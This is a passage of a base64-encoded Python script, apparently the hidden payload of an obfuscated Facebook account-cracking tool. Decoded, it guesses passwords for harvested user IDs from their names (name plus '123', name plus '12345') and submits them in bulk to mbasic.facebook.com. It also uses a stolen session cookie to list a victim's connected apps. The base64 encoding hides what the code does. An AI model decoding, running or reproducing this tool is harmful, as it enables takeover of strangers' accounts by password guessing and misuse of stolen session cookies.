Q6ICMgWW8gTmRhayBUYXUgS29rIFRhbnlhIFNhaWEKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHVpZCwgbmFtZSA9IHpzYi5zcGxpdCgnfCcpCiAgICAgICAgICAgICAgICAgICAgICAgIHh6ID0gbmFtZS5zcGxpdCgnICcpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih4eikgPT0gMyBvciBsZW4oeHopID09IDQgb3IgbGVuKHh6KSA9PSA1IG9yIGxlbih4eikgPT0gNjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSJdCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiXQogICAgICAgICAgICAgICAgICAgICAgICBoZWFsdGh3b3JsZC5zdWJtaXQoc2VsZi5fX21ldG9kZV9fLCB1aWQsIHB3eCwgIm1iYXNpYy5mYWNlYm9vay5jb20iKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICBoYXNpbChvayxjcCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCgnXG4gU2VsZWN0IFZhbGlkIE9uZScpCiAgICAgICAgICAgIHNlbGYuX19wbGVyX18oKQoKIyBDRUsgQVBMSUNBVElPTlMKZGVmIGNla19hcGsoa3VraSk6CglzZXNzaW9uID0gcmVxdWVzdHMuU2Vzc2lvbigpCgl3PXNlc3Npb24uZ2V0KCJodHRwczovL20uZmFjZWJvb2suY29tL3NldHRpbmdzL2FwcHMvdGFiYmVkLz90YWI9YWN0aXZlIixjb29raWVzPXsiY29va2llIjoibm9zY3JpcHQ9MTsiK2t1a2l9KS50ZXh0Cglzb3AgPSBiczQuQmVhdXRpZnVsU291cCh3LCJodG1sLnBhcnNlciIpCgl4ID0gc29wLmZpbmQoImZvcm0iLG1ldGhvZD0icG9zdCIpCglnYW1lID0gW2kudGV4dCBmb3IgaSBpbiB4LmZpbmRfYWxsKCJoMyIpXQoJdHJ5OgoJCWZvciBpIGluIHJhbmdlKGxlbihnYW1lKSk6CgkJCXByaW50ICgiXG4gICVzJXMuICVzJXMiJShQLGkrMSxILGdhbWVbaV0ucmVwbGFjZSgiRGl0YW1iYWhrYW4gcGFkYSIsIiBEaXRhbWJhaGthbiBwYWRhIikpKQoJZXhjZXB0IEF0dHJpYnV0ZUVycm9yOgoJCXByaW50ICgiXG4lc+KAoiBjb29raWUgaW52YWxpZCIlKE0pKQoJdz1zZXNzaW9uLmdldCgiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWluYWN0aXZlIixjb29raWVzPXsiY29va2llIjoibm9zY3JpcHQ9MTsiK2t1a2l9KS50ZXh0Cglzb3AgPSBiczQuQmVhdXRpZnVsU291cCh3LCJodG1sLnBhcnNlciIpCgl4ID0gc29wLmZpbmQoImZvcm0iLG1ldGhvZD0icG9zdCIpCglnYW1lID0gW2kudGV4dCBmb3IgaSBpbiB4LmZpbmRfYWxsKCJoMyIpXQoJdHJ5OgoJCWZvciBpIGluIHJhbmdlKGxlbihnYW1lKSk6CgkJCXByaW50ICgiXG4gICAlcyVzLiAlcyVzIiUoUCxpKzEsTSxnYW1lW2ldLnJlcGxhY2UoIktlZGFsdXdhcnNhIiwiIEtlZGFsdXdhcnNhIikpKQoJZXhjZXB0IEF0dHJpYnV0ZUVycm9yOgoJCXByaW50ICgiXG4lc+KAoiBjb29raWUgaW52YWxpZCIlKE0pKQoKCgpjbGFzcyBsb2FkOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIF8gPSAnJwogICAgICAgIF9fID0gaW50KCczMCcpCiAgICAgICAgX19fID0gaW50KCcwJykKICAgICAgICBfXyAtPSAxCiAgICAgICAgX19fICs9IDEKICAgICAgICBmb3IgdCBpbiByYW5nZShpbnQoIjEiKSk6CiAgICAgICAgICAgIHByaW50KCdcciBQbGVhc2UgV2FpdCAuLi4uJykKICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4xKQogICAgICAgIHByaW50KCdcbicpCgptYWluX2FwdigpCg=="))